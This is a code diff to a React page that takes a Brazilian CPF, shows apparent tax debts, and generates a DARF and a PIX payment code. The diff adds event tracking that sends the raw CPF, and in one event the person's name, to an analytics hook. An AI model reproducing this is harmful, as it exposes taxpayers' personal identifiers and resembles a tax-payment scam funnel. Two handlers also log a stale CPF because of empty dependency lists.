@@ -1,10 +1,11 @@
-import { useState, useCallback } from "react";
+import { useState, useCallback, useEffect } from "react";
 import CpfInput from "@/components/CpfInput";
 import LoadingScreen from "@/components/LoadingScreen";
 import ResultScreen from "@/components/ResultScreen";
 import DarfScreen from "@/components/DarfScreen";
 import PixLoadingScreen from "@/components/PixLoadingScreen";
 import PixPaymentScreen from "@/components/PixPaymentScreen";
+import { useTracking } from "@/hooks/useTracking";
 
 type Screen = "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment";
 
@@ -30,15 +31,22 @@ const Index = () => {
   const [cpf, setCpf] = useState("");
   const [result, setResult] = useState<ResultData | null>(null);
   const [pixCopiaCola, setPixCopiaCola] = useState("");
+  const { trackEvent } = useTracking();
+
+  useEffect(() => {
+    trackEvent("page_view");
+  }, [trackEvent]);
 
   const handleCpfSubmit = (value: string) => {
     setCpf(value);
     setScreen("loading");
+    trackEvent("cpf_submitted", value);
   };
 
   const handleLoadingComplete = useCallback((data: ResultData) => {
     setResult(data);
     setScreen("result");
+    trackEvent("result_viewed", cpf, { nome: data.nome, pendencias: data.pendencias.length });
   }, []);
 
   const handleBack = () => {
@@ -49,6 +57,7 @@ const Index = () => {
 
   const handleRegularizar = () => {
     setScreen("darf");
+    trackEvent("darf_viewed", cpf);
   };
 
   const handleBackToResult = () => {
@@ -57,11 +66,13 @@ const Index = () => {
 
   const handleGerarDarf = () => {
     setScreen("pix-loading");
+    trackEvent("pix_generating", cpf);
   };
 
   const handlePixComplete = useCallback((pix: string) => {
     setPixCopiaCola(pix);
     setScreen("pix-payment");
+    trackEvent("pix_generated", cpf, { pix_length: pix.length });
   }, []);
 
   const handlePixError = useCallback(() => {
